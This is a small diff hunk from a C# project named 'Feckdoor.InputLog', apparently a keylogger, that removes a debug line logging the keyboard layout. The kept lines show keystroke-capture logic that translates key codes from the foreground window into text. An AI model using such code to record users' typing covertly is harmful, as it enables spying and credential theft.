@@ -83,7 +83,6 @@ namespace Feckdoor.InputLog
 
 				var sb = new StringBuilder(256);
 				IntPtr layout = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint _));
-				Log.Information("Current layout: {layout}", (layout.ToInt32() & 0xFFFF0000) >> 16);
 				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, Convert.ToUInt32(altDown), layout);
 				if (bufferLen != 0)
 				{
